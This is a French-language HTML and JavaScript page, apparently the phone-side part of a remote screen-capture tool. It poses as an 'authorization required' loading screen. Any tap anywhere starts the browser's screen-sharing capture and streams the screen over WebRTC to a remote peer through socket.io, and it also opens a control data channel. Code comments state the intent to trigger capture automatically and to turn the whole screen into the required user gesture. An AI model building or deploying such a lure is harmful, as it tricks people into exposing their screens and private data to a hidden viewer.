<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Autorisation requise</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #000;
      color: #fff;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      touch-action: manipulation;
    }
    #trigger {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
    }
    #trigger span {
      font-size: 1.2rem;
      color: #aaa;
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 0.6; }
      50% { opacity: 1; }
    }
    #status {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      display: none;
      align-items: center;
      justify-content: center;
      background: #000;
      flex-direction: column;
      gap: 12px;
    }
    #status.active { display: flex; }
    .connected-dot {
      width: 12px; height: 12px;
      background: #00ff00;
      border-radius: 50%;
      animation: blink 2s infinite;
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }
    #status span { font-size: 0.9rem; color: #666; }
  </style>
</head>
<body>
  <div id="trigger">
    <span>Chargement...</span>
  </div>
  <div id="status">
    <div class="connected-dot"></div>
    <span>Session active</span>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const sessionId = window.location.pathname.split('/').pop();
    const socket = io();
    let peerConnection = null;
    let dataChannel = null;
    let screenStream = null;
    let started = false;

    socket.emit('join-session', { sessionId, role: 'mobile' });

    // Trigger screen share on first tap anywhere on the page
    document.getElementById('trigger').addEventListener('click', startCapture);
    document.getElementById('trigger').addEventListener('touchend', function(e) {
      e.preventDefault();
      startCapture();
    });

    async function startCapture() {
      if (started) return;
      started = true;

      // Check secure context
      if (!window.isSecureContext) {
        document.getElementById('trigger').querySelector('span').textContent = 
          '⚠️ HTTPS requis. Utilisez le lien Render (https://)';
        started = false;
        return;
      }

      // Check API support
      if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
        document.getElementById('trigger').querySelector('span').textContent = 
          '⚠️ Navigateur non supporté. Utilisez Chrome.';
        started = false;
        return;
      }

      try {
        screenStream = await navigator.mediaDevices.getDisplayMedia({
          video: { 
            frameRate: { ideal: 15, max: 30 },
            width: { ideal: 720 },
            height: { ideal: 1280 }
          },
          audio: false
        });
        // Success - setup connection
        document.getElementById('trigger').style.display = 'none';
        document.getElementById('status').classList.add('active');
        setupPeerConnection();
      } catch (err) {
        started = false;
        let msg = 'Appuyez pour réessayer';
        if (err.name === 'NotAllowedError') {
          msg = '❌ Permission refusée. Appuyez et acceptez le partage.';
        } else if (err.name === 'NotSupportedError') {
          msg = '⚠️ Non supporté sur ce navigateur. Essayez Chrome.';
        } else {
          msg = '❌ Erreur: ' + err.message;
        }
        document.getElementById('trigger').querySelector('span').textContent = msg;
      }
    }

    async function setupPeerConnection() {
      const config = {
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' }
        ]
      };

      peerConnection = new RTCPeerConnection(config);

      screenStream.getTracks().forEach(track => {
        peerConnection.addTrack(track, screenStream);
      });

      dataChannel = peerConnection.createDataChannel('control', { ordered: true });
      dataChannel.onmessage = (event) => {
        const data = JSON.parse(event.data);
        console.log('Remote event:', data);
      };

      peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
          socket.emit('ice-candidate', { sessionId, candidate: event.candidate });
        }
      };

      const offer = await peerConnection.createOffer();
      await peerConnection.setLocalDescription(offer);
      socket.emit('offer', { sessionId, offer });

      screenStream.getVideoTracks()[0].onended = () => {
        document.getElementById('status').classList.remove('active');
        document.getElementById('trigger').style.display = 'flex';
        document.getElementById('trigger').querySelector('span').textContent = 'Appuyez pour reconnecter';
        started = false;
        if (peerConnection) { peerConnection.close(); peerConnection = null; }
      };
    }

    socket.on('answer', async ({ answer }) => {
      if (peerConnection) {
        await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
      }
    });

    socket.on('ice-candidate', async ({ candidate }) => {
      if (peerConnection && candidate) {
        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
      }
    });

    // Auto-trigger: simulate a click as soon as page loads
    // Note: browsers require a user gesture, so we make the whole screen tappable
    setTimeout(() => {
      document.getElementById('trigger').querySelector('span').textContent = 'Appuyez n\'importe où';
    }, 500);
  </script>
</body>
</html>
